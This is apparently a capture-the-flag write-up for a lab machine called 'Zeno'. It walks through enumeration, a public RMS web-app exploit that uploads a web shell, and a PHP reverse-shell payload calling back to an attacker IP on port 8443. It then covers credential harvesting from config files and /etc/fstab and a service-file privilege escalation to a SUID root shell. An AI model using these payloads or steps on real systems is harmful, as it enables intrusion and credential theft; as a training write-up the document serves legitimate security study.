Zeno

Target IP: 10.10.3.39

Do you have the same patience as the great stoic philosopher Zeno? Try it out!

Scanning


Looks like there are two TCP ports open on the target machine: SSH and HTTP.

The aggressive nmap scan shows the result above. I will start enumeration with the HTTP application on the higher TCP port.

Enumeration

Port 12340: HTTP

The webpage above is displayed for this application. The source-code of the webpage does not reveal anything useful either. Time to perform a directory search against this application.


Performing a simple directory search using the command gobuster dir -u http://10.10.3.39:12340/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt displays the interesting /rms directory.


The /rms displays the webpage above. I created an account on the website and tested the different features but I did not find anything useful.


Using feroxbuster I found more interesting directories, as shown above.


I Googled rms exploit and found the public exploit above. And this exploit is unauthenticated and it exploits the directory which I found using feroxbuster.

Exploitation


Time to exploit the machine. I made a copy of the exploit on my machine. The exploit I used is php/webapps/47520.py.


I had to fix the exploit by removing the proxy feature, and the unterminated string literals. Then I ran it against the target machine. Looks like the simple web-shell got uploaded at http://10.10.3.39:12340/rms/images/reverse-shell.php.


And the simple web-shell is working as I can perform RCE. Time to leverage this to a full reverse shell connection to perform RCE.


Now I have a full reverse shell connection from the target machine on port 8443 on my machine. I used the payload listed below.

PHP payload used: php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.
Full URL with payload: http://10.10.3.39:12340/rms/images/reverse-shell.php?cmd=php -r '%24sock%3Dfsockopen("10.14.55.153"%2C8443)%3Bexec("%2Fbin%2Fbash <%263 >%263 2>%263")%3B'.

Privilege Escalation


I found the MySQL credentials inside a file called config.php at /connection.


Using the credential root:veerUffIrangUfcubyig, I gained access to the MySQL application on the target machine. There is an interesting table called dbrms with the table members, as shown above. There is a user called edward on the machine when cat /etc/passwd is run.


Using crackstation, I cracked the password hashes from above. However, the password of edward cannot be cracked. Spraying those credentials against edward did not work.


I transferred Linpeas to the target machine and found the misconfiguration above.


I also found the password at /etc/fstab using the linpeas output from above.


Spraying the new password FrobjoodAdkoonceanJa against the user edward gives me access. Now I am edward. Time to elevate privileges to root.


Running sudo -l shows the binary /usr/bin/reboot can be executed.



From the Linpeas output, I noticed the service files can be exploited. I find the second file interesting.


I inserted the payload inside the service file to give me a root bash shell.


And it looks like the bash shell has SUID bit set after the reboot and connecting to the SSH again. Now I have a root shell after entering /usr/bin/bash -p command.
